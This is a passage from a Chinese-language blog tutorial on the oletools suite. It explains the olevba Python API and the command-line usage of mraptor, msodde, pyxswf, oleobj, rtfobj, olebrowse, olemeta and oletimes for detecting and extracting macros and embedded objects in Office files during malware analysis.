OLE (MS Office 97-2003)，OpenXML (MS Office 2007+)，MHTML 或 Word 2003 XML，则 VBA_Parser 将引发异常。解析文件后，VBA_Parser.type 属性是表明文件类型的字符串。它可以是 TYPE_OLE，TYPE_OpenXML，TYPE_Word2003_XML 或 TYPE_MHTML (在 olevba 模块中定义的常量)。</p><span class='p blue'>检测 VBA 宏</span><p>VBA_Parser 对象中的 detect_vba_macros 方法可检测 VBA 宏是否存在，若存在，则返回 True，否则返回 False，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> vbaparser.detect_vba_macros():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;VBA Macros found&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;No VBA Macros found&#x27;</span></span><br></pre></td></tr></table></figure><p>检测算法会在 OLE 结构中查找具有特定名称的流和存储结构，这对于上面列出的所有受支持的格式都适用。但是，对于某些格式 (例如 PowerPoint 97-2003)，此方法将始终返回 False，因为 VBA 宏是以 olevba 尚不支持的另一种方式存储的。此外，如果文件包含嵌入式文档 (例如，插入到 Word 文档中的 Excel 工作簿)，即使嵌入的文档包含 VBA 宏，此方法可能返回 True，即使没有了主文档。</p><div class="tip warning faa-horizontal animated"><p>原文作者是用了 may return True，具体可自行去验证</p></div><span class='p blue'>提取 VBA 宏代码</span><p>extract_macros 方法可在文件 (可能包括嵌入式文件) 中找到每个 VBA 宏，并把它们提取和解压缩，会为找到的每个 VBA 宏生成一个 tuple (filename，stream_path，vba_filename，vba_code)。</p><ul><li>filename：如果文件是 OLE (MS Office 97-2003) 类型，则 filename 是文件的路径。如果文件是 OpenXML (MS Office 2007+) 类型，则 filename 是压缩包中包含 VBA 宏的 OLE 子文件的路径，例如 word/vbaProject.bin</li><li>stream_path：包含 VBA 宏代码的 OLE 流路径</li><li>vba_filename：对应的 VBA 文件名</li><li>vba_code：以明文形式包含的 VBA 代码字符串</li></ul><p>举个粟子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (filename, stream_path, vba_filename, vba_code) <span class="keyword">in</span> vbaparser.extract_macros():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;-&#x27;</span>*<span class="number">79</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Filename    :&#x27;</span>, filename</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;OLE stream  :&#x27;</span>, stream_path</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;VBA filename:&#x27;</span>, vba_filename</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;- &#x27;</span>*<span class="number">39</span></span><br><span class="line">    <span class="built_in">print</span> vba_code</span><br></pre></td></tr></table></figure><span class='p blue'>分析 VBA 宏代码</span><p>从 v0.40 版本开始，已经用 VBA_Parser 类来替代 VBA_Scanner 类，VBA_Scanner 类已被废弃，类中提供的方法都用来分析宏。</p><p>VBA_Parser 类中的 analyze_macros 方法能够从所有的 VBA 模块中找到混淆的字符串、可疑的关键字、IOCs、自动执行宏等等。</p><p>VBA_Parser.analyze_macros() 方法返回一个包含 tuple(type, keyword, description) 的列表，以下为其中之一的所有项</p><ul><li>type 的值为 AutoExec、Suspicious、IOC、Hex String、Base64 String、Dridex String、VBA obfuscated Strings 中之一</li><li>keyword 的值为自动执行宏、可疑关键字或 IOCs。对于混淆的字符串来说，这是解码后的字符串</li><li>description 的值提供 keyword 的描述，对于混淆的字符串来说，这是解码后的字符串</li></ul><p>举个粟子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">results = vbaparser.analyze_macros()</span><br><span class="line"><span class="keyword">for</span> kw_type, keyword, description <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;type=%s - keyword=%s - description=%s&#x27;</span> % (kw_type, keyword, description)</span><br></pre></td></tr></table></figure><p>在调用 analyze_macros 方法后，下列 VBA_Parser 这些属性在每一个分类中都能显示相关条目的数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;AutoExec keywords: %d&#x27;</span> % vbaparser.nb_autoexec</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Suspicious keywords: %d&#x27;</span> % vbaparser.nb_suspicious</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;IOCs: %d&#x27;</span> % vbaparser.nb_iocs</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Hex obfuscated strings: %d&#x27;</span> % vbaparser.nb_hexstrings</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Base64 obfuscated strings: %d&#x27;</span> % vbaparser.nb_base64strings</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Dridex obfuscated strings: %d&#x27;</span> % vbaparser.nb_dridexstrings</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;VBA obfuscated strings: %d&#x27;</span> % vbaparser.nb_vbastrings</span><br></pre></td></tr></table></figure><span class='p blue'>对 VBA 宏代码去混淆</span><p>reveal 方法可去混淆，去混淆原理为将解码后的内容替换原来混淆的字符串，并返回一个字符串。</p><p>举个粟子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> vbaparser.reveal()</span><br></pre></td></tr></table></figure><span class='p blue'>关闭 VBA_Parser</span><p>在使用过后，最好是调用 VBA_Parser 对象中的关闭方法，以确保文件被关闭，特别是当你解析很多文件时更应该这样做</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vbaparser.close()</span><br></pre></td></tr></table></figure><h3 id="废弃的-API"><a href="#废弃的-API" class="headerlink" title="废弃的 API"></a>废弃的 API</h3><div class="tip error"><p>关于废弃的 API，这里就没必要讲了</p></div><h2 id="mraptor-MacroRaptor"><a href="#mraptor-MacroRaptor" class="headerlink" title="mraptor (MacroRaptor)"></a>mraptor (MacroRaptor)</h2><p>mraptor 使用一般启发式技术来检测大多数恶意 VBA 宏，与反病毒引擎不同，它不依赖于特征。简而言之，mraptor 可以检测以下三种行为类型所对应的关键字 (明文)</p><ul><li>A：触发自动执行行为</li><li>W：对文件系统和内存有写行为</li><li>X：在 VBA 内容外执行文件或 payload</li></ul><p>当以上三个标记其中有一个为 True 时，mraptor 就会认为此宏为恶意的。如果你想要了解关于 mraptor 检测算法，可参看 <a href="http://www.decalage.info/mraptor">这篇文章</a>。mraptor 不仅可以作为一个命令行工具，也可以在你的 Python 应用程序中当作模块导入。</p><h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Usage: mraptor [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open all files from it,</span><br><span class="line">                        using the provided password (requires Python 2.6+)</span><br><span class="line">  -f ZIP_FNAME, --zipfname=ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br><span class="line">  -l LOGLEVEL, --loglevel=LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  -m, --matches         Show matched strings.</span><br><span class="line">An exit code is returned based on the analysis result:</span><br><span class="line"> - 0: No Macro</span><br><span class="line"> - 1: Not MS Office</span><br><span class="line"> - 2: Macro OK</span><br><span class="line"> - 10: ERROR</span><br><span class="line"> - 20: SUSPICIOUS</span><br></pre></td></tr></table></figure><h3 id="一些粟子-1"><a href="#一些粟子-1" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mraptor file.doc</span><br></pre></td></tr></table></figure><p>扫描一个加了密的的 zip 压缩文件，密码为 <code>infected</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mraptor malicious_file.xls.zip -z infected</span><br></pre></td></tr></table></figure><p>扫描一个文件夹下的所有文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mraptor &quot;MalwareZoo/VBA/*&quot;</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：在 Linux/MacOSX 上，使用 * 和 ？等通配符时，请始终在文件名前后加上双引号， 否则，shell 可以在启动脚本之前用与通配符匹配的文件的实际列表替换参数。</p></div><p><img src="https://image.zeronohacker.com/article/2020/09/08/117e17608d934428abb8af185cdf9b6d.png" alt=""></p><h3 id="Python3-支持-——-mraptor3"><a href="#Python3-支持-——-mraptor3" class="headerlink" title="Python3 支持 —— mraptor3"></a>Python3 支持 —— mraptor3</h3><p>自从 v0.54 版本以来，mraptor 完全兼容 Python2 和 Python3，因此 mraptor3 就没必要再去使用了，但是为了向下兼容，还是将它保留了。</p><h3 id="在-Python-应用程序中如何使用-mraptor"><a href="#在-Python-应用程序中如何使用-mraptor" class="headerlink" title="在 Python 应用程序中如何使用 mraptor"></a>在 Python 应用程序中如何使用 mraptor</h3><p>TODO</p><h2 id="msodde"><a href="#msodde" class="headerlink" title="msodde"></a>msodde</h2><p>msodde 可在 MS Office 中检测和提取 DDE 链接 (例如 DDEAUTO)，被用来运行恶意命令传递恶意软件。它还支持 CSV 文件，CSV 文件可能包含 Excel 公式，目的是为了方便使用 DDE (称为 CSV 注入) 运行可执行文件。对于 Word 文档，它可以提取所有字段，并识别其中的可疑字段。</p><p>支持的格式</p><ul><li>Word 97-2003 (.doc, .dot), Word 2007+ (.docx, .dotx, .docm, .dotm)</li><li>Excel 97-2003 (.xls), Excel 2007+ (.xlsx, .xlsm, .xlsb)</li><li>RTF</li><li>CSV (exported from/imported into Excel)</li><li>XML (exported from Word 2003, Word 2007+, Excel 2003, Excel 2007+)</li></ul><p>对于 Word 文档，msodde 会检测使用 QUOTE 混淆的 DDE 命令，并自动对其进行去混淆。msodde 可以用作命令行工具，也可以在你的 Python 应用程序中当作模块导入。</p><h3 id="关于-DDE-的漏洞利用分析文章"><a href="#关于-DDE-的漏洞利用分析文章" class="headerlink" title="关于 DDE 的漏洞利用分析文章"></a>关于 DDE 的漏洞利用分析文章</h3><p>个人还是比较推荐大家看一下 ^_^</p><ul><li><a href="https://www.contextis.com/blog/comma-separated-vulnerabilities">https://www.contextis.com/blog/comma-separated-vulnerabilities</a></li><li><a href="http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/">http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/</a></li><li><a href="https://pwndizzle.blogspot.nl/2017/03/office-document-macros-ole-actions-dde.html">https://pwndizzle.blogspot.nl/2017/03/office-document-macros-ole-actions-dde.html</a></li><li><a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/</a></li><li><a href="http://staaldraad.github.io/2017/10/23/msword-field-codes/">http://staaldraad.github.io/2017/10/23/msword-field-codes/</a></li><li><a href="https://xorl.wordpress.com/2017/12/11/microsoft-excel-csv-code-execution-injection-method/">https://xorl.wordpress.com/2017/12/11/microsoft-excel-csv-code-execution-injection-method/</a></li><li><a href="http://georgemauer.net/2017/10/07/csv-injection.html">http://georgemauer.net/2017/10/07/csv-injection.html</a></li><li><a href="http://blog.7elements.co.uk/2013/01/cell-injection.html">http://blog.7elements.co.uk/2013/01/cell-injection.html</a></li><li><a href="https://appsecconsulting.com/blog/csv-formula-injection">https://appsecconsulting.com/blog/csv-formula-injection</a></li><li><a href="https://www.owasp.org/index.php/CSV_Injection">https://www.owasp.org/index.php/CSV_Injection</a></li></ul><h3 id="使用方法-3"><a href="#使用方法-3" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">usage: msodde.py [-h] [-j] [--nounquote] [-l LOGLEVEL] [-p PASSWORD] [-d] [-f]</span><br><span class="line">                 [-a]</span><br><span class="line">                 FILE</span><br><span class="line">positional arguments:</span><br><span class="line">  FILE                  path of the file to be analyzed</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -j, --json            Output in json format. Do not use with -ldebug</span><br><span class="line">  --nounquote           don&#x27;t unquote values</span><br><span class="line">  -l LOGLEVEL, --loglevel LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  -p PASSWORD, --password PASSWORD</span><br><span class="line">                        if encrypted office files are encountered, try</span><br><span class="line">                        decryption with this password. May be repeated.</span><br><span class="line">Filter which OpenXML field commands are returned:</span><br><span class="line">  Only applies to OpenXML (e.g. docx) and rtf, not to OLE (e.g. .doc). These</span><br><span class="line">  options are mutually exclusive, last option found on command line</span><br><span class="line">  overwrites earlier ones.</span><br><span class="line">  -d, --dde-only        Return only DDE and DDEAUTO fields</span><br><span class="line">  -f, --filter          Return all fields except harmless ones</span><br><span class="line">  -a, --all-fields      Return all fields, irrespective of their contents</span><br></pre></td></tr></table></figure><div class="tip "><p>提示：在 v0.54 新版本中，-p 选项被用来解密那些加了密的文档</p></div><h3 id="一些粟子-2"><a href="#一些粟子-2" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msodde file.doc</span><br></pre></td></tr></table></figure><p>扫描一个 Word 文档，提取所有的域</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msodde -a file.doc</span><br></pre></td></tr></table></figure><h3 id="在-Python-应用程序中如何使用-msodde"><a href="#在-Python-应用程序中如何使用-msodde" class="headerlink" title="在 Python 应用程序中如何使用 msodde"></a>在 Python 应用程序中如何使用 msodde</h3><p>这项工作正在进行中，API 预计在将来的版本中更改。</p><h2 id="pyxswf"><a href="#pyxswf" class="headerlink" title="pyxswf"></a>pyxswf</h2><p>pyxswf 可用来在 MS Office 文件中检测、提取和分析嵌入的 Flash 对象 (SWF 文件)，这对于恶意软件分析特别有用。pyxswf 可看作是 xxxswf.py (由 Alexander Hanel 编写) 的一个扩展。与 xxxswf.py 相比，它可以在 MS Office 文档正确解析其 OLE 结构来提取流，这在分离的流中是必须的。分离的流是已知的一种混淆技术，可参看 <a href="http://web.archive.org/web/20121118021207/http://www.breakingpointsystems.com/resources/blog/evasion-with-ole2-fragmentation/">这篇文章</a> 来了解。</p><h3 id="使用方法-4"><a href="#使用方法-4" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Usage: pyxswf [options] &lt;file.bad&gt;</span><br><span class="line">Options:</span><br><span class="line">  -o, --ole             Parse an OLE file (e.g. Word, Excel) to look for SWF</span><br><span class="line">                        in each stream</span><br><span class="line">  -f, --rtf             Parse an RTF file to look for SWF in each embedded</span><br><span class="line">                        object</span><br><span class="line">  -x, --extract         Extracts the embedded SWF(s), names it MD5HASH.swf &amp;</span><br><span class="line">                        saves it in the working dir. No addition args needed</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -y, --yara            Scans the SWF(s) with yara. If the SWF(s) is</span><br><span class="line">                        compressed it will be deflated. No addition args</span><br><span class="line">                        needed</span><br><span class="line">  -s, --md5scan         Scans the SWF(s) for MD5 signatures. Please see func</span><br><span class="line">                        checkMD5 to define hashes. No addition args needed</span><br><span class="line">  -H, --header          Displays the SWFs file header. No addition args needed</span><br><span class="line">  -d, --decompress      Deflates compressed SWFS(s)</span><br><span class="line">  -r PATH, --recdir=PATH</span><br><span class="line">                        Will recursively scan a directory for files that</span><br><span class="line">                        contain SWFs. Must provide path in quotes</span><br><span class="line">  -c, --compress        Compresses the SWF using Zlib</span><br></pre></td></tr></table></figure><h3 id="一些粟子-3"><a href="#一些粟子-3" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>在 Word 文档中提取和检测 SWF 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\oletools&gt;pyxswf -o word_flash.doc</span><br><span class="line">OLE stream: &#x27;Contents&#x27;</span><br><span class="line">[SUMMARY] 1 SWF(s) in MD5:993664cc86f60d52d671b6610813cfd1:Contents</span><br><span class="line">        [ADDR] SWF 1 at 0x8  - FWS Header</span><br><span class="line">C:\oletools&gt;pyxswf -xo word_flash.doc</span><br><span class="line">OLE stream: &#x27;Contents&#x27;</span><br><span class="line">[SUMMARY] 1 SWF(s) in MD5:993664cc86f60d52d671b6610813cfd1:Contents</span><br><span class="line">        [ADDR] SWF 1 at 0x8  - FWS Header</span><br><span class="line">                [FILE] Carved SWF MD5: 2498e9c0701dc0e461ab4358f9102bc5.swf</span><br></pre></td></tr></table></figure><p>在 RTF 文档中提取和检测 SWF 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\oletools&gt;pyxswf -xf &quot;rtf_flash.rtf&quot;</span><br><span class="line">RTF embedded object size 1498557 at index 000036DD</span><br><span class="line">[SUMMARY] 1 SWF(s) in MD5:46a110548007e04f4043785ac4184558:RTF_embedded_object_0</span><br><span class="line">00036DD</span><br><span class="line">        [ADDR] SWF 1 at 0xc40  - FWS Header</span><br><span class="line">                [FILE] Carved SWF MD5: 2498e9c0701dc0e461ab4358f9102bc5.swf</span><br></pre></td></tr></table></figure><h3 id="在-Python-应用程序中如何使用-pyxswf"><a href="#在-Python-应用程序中如何使用-pyxswf" class="headerlink" title="在 Python 应用程序中如何使用 pyxswf"></a>在 Python 应用程序中如何使用 pyxswf</h3><p>TODO</p><h2 id="oleobj"><a href="#oleobj" class="headerlink" title="oleobj"></a>oleobj</h2><p>oleobj 可从 OLE 文件中提取嵌入的对象，oleobj 不仅可以作为一个命令行工具，也可以在你的 Python 应用程序中当作模块导入。此工具官方未作过多详细说明。</p><h3 id="使用方法-5"><a href="#使用方法-5" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">usage: usage: oleobj.py [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">positional arguments:</span><br><span class="line">  FILE                  Office files to parse (same as -i)</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -d OUTPUT_DIR         use specified directory to output files.</span><br><span class="line">  -z ZIP_PASSWORD, --zip ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open first file from it,</span><br><span class="line">                        using the provided password (requires Python 2.6+)</span><br><span class="line">  -f ZIP_FNAME, --zipfname ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br><span class="line">  -l LOGLEVEL, --loglevel LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  -i FILE, --more-input FILE</span><br><span class="line">                        Additional file to parse (same as positional</span><br><span class="line">                        arguments)</span><br><span class="line">  -v, --verbose         verbose mode, set logging to DEBUG (overwrites -l)</span><br></pre></td></tr></table></figure><h3 id="在-Python-应用程序中如何使用-oleobj"><a href="#在-Python-应用程序中如何使用-oleobj" class="headerlink" title="在 Python 应用程序中如何使用 oleobj"></a>在 Python 应用程序中如何使用 oleobj</h3><p>查看 rtfobj.py 源代码</p><p>TODO</p><h2 id="rtfobj"><a href="#rtfobj" class="headerlink" title="rtfobj"></a>rtfobj</h2><p>rtfobj 可用于检测和提取存储在 RTF 文件中的嵌入式对象，例如 OLE 对象。它还可以检测 OLE 包对象，并提取嵌入式文件。从 v0.50 版本开始，rtfobj 包含一个自定义 RTF 解析器，该解析器旨在匹配 MS Word 的行为，以便处理混淆的 RTF 文件。有关一些具体示例，请查看 <a href="http://decalage.info/rtf_tricks">这篇文章</a>。rtfobj 可用作 Python 库或命令行工具。</p><h3 id="使用方法-6"><a href="#使用方法-6" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">rtfobj [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open first file from it,</span><br><span class="line">                        using the provided password (requires Python 2.6+)</span><br><span class="line">  -f ZIP_FNAME, --zipfname=ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br><span class="line">  -l LOGLEVEL, --loglevel=LOGLEVEL</span><br><span class="line">                        logging level debug/info/warning/error/critical</span><br><span class="line">                        (default=warning)</span><br><span class="line">  -s SAVE_OBJECT, --save=SAVE_OBJECT</span><br><span class="line">                        Save the object corresponding to the provided number</span><br><span class="line">                        to a file, for example &quot;-s 2&quot;. Use &quot;-s all&quot; to save</span><br><span class="line">                        all objects at once.</span><br><span class="line">  -d OUTPUT_DIR         use specified directory to save output files.</span><br></pre></td></tr></table></figure><p>rtfobj 可显示已检测到的 OLE 和 Package 对象的列表及其属性，例如类和文件名。当 OLE Package 对象包含可执行文件或脚本时，会突出显示，例如：</p><p><img src="https://image.zeronohacker.com/article/2020/09/08/dfb8fa01393851d83f24eecbbeabfbd0.png" alt=""></p><p>要提取对象或文件，请使用 -s 选项，后跟表中所表示的对象编号，例如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rtfobj -s 0</span><br></pre></td></tr></table></figure><p>它提取并解码相应的对象，并将其保存为名为 object_xxxx.bin 的文件，其中 xxxx 是对象在 RTF 文件中的位置。</p><h3 id="在-Python-应用程序中如何使用-rtfobj"><a href="#在-Python-应用程序中如何使用-rtfobj" class="headerlink" title="在 Python 应用程序中如何使用 rtfobj"></a>在 Python 应用程序中如何使用 rtfobj</h3><p>从 v0.50 版本开始，API 发生了重大变化，并且尚未最终确定。具体请参见 rtfobj 源码中的 RtfObjectParser 类。废弃的 API 在此不讲。</p><h2 id="olebrowse"><a href="#olebrowse" class="headerlink" title="olebrowse"></a>olebrowse</h2><p>olebrowse 是一个简单的 GUI 程序，可以浏览 OLE 文件 (例如 MS Word，Excel，Powerpoint 文档)，以查看和提取单个数据流。</p><h3 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h3><p>olebrowse 需要 Tkinter，在 Windows 和 MacOSX 上，可使用 Python 进行安装。但是，在 Linux 上，例如在 Ubuntu 上，可通过以下命令完成此操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-tk</span><br></pre></td></tr></table></figure><p>安装 Python3 版本的 Tkinter</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3-tk</span><br></pre></td></tr></table></figure><p>其实在安装 oletools 时会自动帮你处理好依赖关系。</p><h3 id="使用方法-7"><a href="#使用方法-7" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olebrowse [file]</span><br></pre></td></tr></table></figure><p>如果你提供一个文件，它将被打开，否则将出现一个对话框，让你浏览文件夹以打开文件。然后，如果它是有效的 OLE 文件，将显示数据流列表。你可以选择一个流，然后在内置的十六进制查看器中查看其内容，或将其保存到文件中以进行进一步分析。</p><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>主菜单上显示 OLE 文件中的所有流</p><p><img src="https://image.zeronohacker.com/article/2020/09/08/874e2f509f5186141efe8d3ca1daf61d.png" alt=""></p><p>流操作菜单</p><p><img src="https://image.zeronohacker.com/article/2020/09/08/d1ebbe94ddb6c64b413d1e3139903d66.png" alt=""></p><p>流的十六进制视图</p><p><img src="https://image.zeronohacker.com/article/2020/09/08/8d3ee6a1c01caa7a2aebbeddd5d2c7f1.png" alt=""></p><h2 id="olemeta"><a href="#olemeta" class="headerlink" title="olemeta"></a>olemeta</h2><p>olemeta 可用于解析 OLE 文件 (例如 MS Office 文档中的 Word，Excel)，以提取 OLE 文件中存在的所有标准属性。</p><h3 id="使用方法-8"><a href="#使用方法-8" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olemeta &lt;file&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/09/08/f19082ebe38d0de8203b0c9890b6d440.png" alt=""></p><h3 id="在-Python-应用程序中如何使用-olemeta"><a href="#在-Python-应用程序中如何使用-olemeta" class="headerlink" title="在 Python 应用程序中如何使用 olemeta"></a>在 Python 应用程序中如何使用 olemeta</h3><p>TODO</p><h2 id="oletimes"><a href="#oletimes" class="headerlink" title="oletimes"></a>oletimes</h2><p>oletimes 可用于解析 OLE 文件 (例如 MS Office 文档中的 Word，Excel)，以提取 OLE 文件中所有流和存储的创建和修改时间。</p><h3 id="使用方法-9"><a href="#使用方法-9" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oletimes &lt;file&gt;</span><br></pre></td></tr></table></figure><p>对 DIAN_caso-5415.doc 这个恶意样本检测</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 